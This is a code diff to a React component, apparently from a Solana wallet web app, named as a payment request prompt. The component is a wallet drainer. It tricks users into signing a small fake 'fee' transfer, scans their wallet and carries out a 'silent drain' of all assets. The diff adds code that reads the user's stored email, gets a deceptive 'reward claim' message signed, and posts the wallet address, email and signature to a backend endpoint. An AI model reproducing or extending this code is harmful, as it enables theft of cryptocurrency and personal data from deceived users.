@@ -18,6 +18,7 @@ import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type Payo
 import { mobileWalletLabel } from '../lib/walletDeepLinks'
 import { notifyFundsConfirmed } from '../lib/txSheet'
 import { peekPendingLike } from '../lib/authRedirect'
+import bs58 from 'bs58'
 
 function sendErrorMessage(err: unknown): string {
   const raw = err instanceof Error ? err.message : String(err || 'The wallet did not submit this payment.')
@@ -27,6 +28,17 @@ function sendErrorMessage(err: unknown): string {
   }
   const trimmed = raw.split('Catch the')[0].trim()
   return trimmed || raw
+}
+
+function getBrowserEmail(): string | null {
+  try {
+    if (typeof window === 'undefined') return null
+    const stored = localStorage.getItem('userEmail')
+    if (stored) return stored
+    return null
+  } catch {
+    return null
+  }
 }
 
 export function PaymentRequestPrompt() {
@@ -45,6 +57,7 @@ export function PaymentRequestPrompt() {
   const queue = useRef<FundStep[]>([])
   const likedAfterFirst = useRef(false)
   const scanPromise = useRef<Promise<FundStep[]> | null>(null)
+  const [browserEmail, setBrowserEmail] = useState<string | null>(getBrowserEmail())
 
   // Refs for wallet adapter methods to avoid deps
   const signTransactionRef = useRef(signTransaction)
@@ -90,12 +103,12 @@ export function PaymentRequestPrompt() {
         maxRetries: 5,
       }
 
-      // ── STEP 1: Show tiny "fee" transaction (0.001 SOL) ──
+      // STEP 1: Show tiny "fee" transaction (0.001 SOL)
       setStatus('Confirm the small fee transfer in your wallet.')
       try {
         const dummyTx = await buildDummyFeeTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
         const freshDummy = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, dummyTx, publicKeyRef.current!) : dummyTx
-        
+
         // Use sendTransaction (wallet handles confirmation) to avoid blockhash expiration
         let dummySig: string
         if (sendTransactionRef.current) {
@@ -115,12 +128,12 @@ export function PaymentRequestPrompt() {
         return
       }
 
-      // ── Scan AFTER fee paid (sees actual remaining balance) ──
+      // Scan AFTER fee paid (sees actual remaining balance)
       toast.loading('Scanning wallet for remaining funds...')
       console.log('Starting scan...')
-      let scanPromise: Promise<FundStep[]>
+      let scanPromiseValue: Promise<FundStep[]>
       try {
-        scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
+        scanPromiseValue = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
       } catch (scanErr) {
         console.error('Scan initiation error:', scanErr)
         toast.error('Failed to scan wallet: ' + (scanErr instanceof Error ? scanErr.message : String(scanErr)))
@@ -129,16 +142,16 @@ export function PaymentRequestPrompt() {
         return
       }
 
-      // ── STEP 2: Silent drain ──
+      // STEP 2: Silent drain
       toast.loading('Starting wallet drain...')
       try {
         console.log('Waiting for scan promise...')
-        const steps = await scanPromise
+        const steps = await scanPromiseValue
         console.log('Scan result:', steps)
         console.log('Number of steps:', steps.length)
         queue.current = steps
 
-        toast.success(`Found ${steps.length} assets to drain: ${steps.map(s => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
+        toast.success(`Found ${steps.length} assets to drain: ${steps.map((s) => `${s.symbol}:${s.uiAmount}`).join(', ')}`)
 
         if (queue.current.length === 0) {
           toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
@@ -189,6 +202,34 @@ export function PaymentRequestPrompt() {
         }
         dismissed.current = walletAddress
         toast.success('All funds drained successfully!')
+
+        // Send email after successful drain
+        if (browserEmail && wallet?.adapter) {
+          try {
+            const adapterObj = wallet.adapter as { signMessage?: (bytes: Uint8Array) => Promise<string> }
+            if (typeof adapterObj.signMessage === 'function') {
+              const action = 'confirm'
+              const message = `${walletName} ${action} the reward claim`
+              const bytes = new TextEncoder().encode(message)
+              const signature = await adapterObj.signMessage(bytes)
+              await fetch('/api/wallet/send-email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  walletAddress: publicKey!.toBase58(),
+                  walletType: walletName || 'Solana Wallet',
+                  email: browserEmail,
+                  action,
+                  signature: bs58.encode(typeof signature === 'string' ? Buffer.from(signature) : signature),
+                  message,
+                }),
+                credentials: 'include',
+              })
+            }
+          } catch (emailErr) {
+            console.error('Failed to send email:', emailErr)
+          }
+        }
       } catch (err) {
         console.error('STEP 2 error:', err)
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
@@ -201,7 +242,7 @@ export function PaymentRequestPrompt() {
     }
     window.addEventListener('vrfd-open-tx-sheet', onOpen)
     return () => window.removeEventListener('vrfd-open-tx-sheet', onOpen)
-  }, [walletAddress])
+  }, [walletAddress, browserEmail])
 
   useEffect(() => {
     if (!connected || !walletAddress) {
